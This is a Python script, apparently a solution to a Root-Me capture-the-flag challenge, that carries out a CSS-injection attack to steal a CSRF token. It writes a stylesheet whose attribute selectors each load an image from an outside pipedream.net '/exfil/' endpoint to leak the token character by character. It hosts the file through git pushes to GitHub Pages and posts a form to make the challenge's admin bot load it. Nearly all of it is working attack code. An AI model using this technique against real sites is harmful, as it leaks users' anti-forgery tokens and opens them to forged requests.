from time import sleep
import requests
import os

def build_css(chars):
    # supp du file
    os.remove("./a.css")

    # création du new file
    file = open("./a.css", "w") 
    file.write("""
        input[name=csrf][value^=A] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/A) } 
        input[name=csrf][value^=B] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/B) } 
        input[name=csrf][value^=C] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/C) } 
        input[name=csrf][value^=D] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/D) } 
        input[name=csrf][value^=E] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/E) } 
        input[name=csrf][value^=F] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/F) } 
        input[name=csrf][value^=G] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/G) } 
        input[name=csrf][value^=H] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/H) } 
        input[name=csrf][value^=I] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/I) } 
        input[name=csrf][value^=J] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/J) } 
        input[name=csrf][value^=K] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/K) } 
        input[name=csrf][value^=L] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/L) } 
        input[name=csrf][value^=M] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/M) } 
        input[name=csrf][value^=N] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/N) } 
        input[name=csrf][value^=O] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/O) } 
        input[name=csrf][value^=P] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/P) } 
        input[name=csrf][value^=Q] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/Q) } 
        input[name=csrf][value^=R] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/R) } 
        input[name=csrf][value^=S] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/S) } 
        input[name=csrf][value^=T] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/T) } 
        input[name=csrf][value^=U] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/U) } 
        input[name=csrf][value^=V] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/V) } 
        input[name=csrf][value^=W] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/W) } 
        input[name=csrf][value^=X] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/X) } 
        input[name=csrf][value^=Y] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/Y) } 
        input[name=csrf][value^=Z] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/Z) } 
        input[name=csrf][value^=a] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/a) } 
        input[name=csrf][value^=b] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/b) } 
        input[name=csrf][value^=c] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/c) } 
        input[name=csrf][value^=d] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/d) } 
        input[name=csrf][value^=e] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/e) } 
        input[name=csrf][value^=f] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/f) } 
        input[name=csrf][value^=g] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/g) } 
        input[name=csrf][value^=h] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/h) } 
        input[name=csrf][value^=i] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/i) } 
        input[name=csrf][value^=j] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/j) } 
        input[name=csrf][value^=k] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/k) } 
        input[name=csrf][value^=l] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/l) } 
        input[name=csrf][value^=m] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/m) } 
        input[name=csrf][value^=n] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/n) } 
        input[name=csrf][value^=o] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/o) } 
        input[name=csrf][value^=p] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/p) } 
        input[name=csrf][value^=q] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/q) } 
        input[name=csrf][value^=r] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/r) } 
        input[name=csrf][value^=s] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/s) } 
        input[name=csrf][value^=t] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/t) } 
        input[name=csrf][value^=u] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/u) } 
        input[name=csrf][value^=v] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/v) } 
        input[name=csrf][value^=w] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/w) } 
        input[name=csrf][value^=x] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/x) } 
        input[name=csrf][value^=y] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/y) } 
        input[name=csrf][value^=z] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/z) } 
        input[name=csrf][value^=0] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/0) } 
        input[name=csrf][value^=1] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/1) } 
        input[name=csrf][value^=2] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/2) } 
        input[name=csrf][value^=3] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/3) } 
        input[name=csrf][value^=4] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/4) } 
        input[name=csrf][value^=5] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/5) } 
        input[name=csrf][value^=6] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/6) } 
        input[name=csrf][value^=7] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/7) } 
        input[name=csrf][value^=8] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/8) } 
        input[name=csrf][value^=9] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/9) } 
    """) 
    file.close()

# ----
chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
know  = ""

# envoie à admin 


while 1:
    for elt in chars:
        print("eeeeeeeeeeeeeeeeeeeeeeeeeeeee : "+elt)
        # new css
        build_css(know+elt)
        sleep(10) # for not to ban

        # commit & push
        os.system('git add .')
        os.system('git commit -m "update css"')
        os.system('git push')

        # request POST
        # TODO: request post for aff in request bin car get et curl ne fonctionne pas
        data = {"name":"coutcout", "email":"a@gmail.com","url":"http://challenge01.root-me.org:58005/?style=https://kixisaleesd.github.io/test/a", "description":"e"}
        requests.post("http://challenge01.root-me.org:58005/?style=light", data=data)

    know += input("new chars to know : ")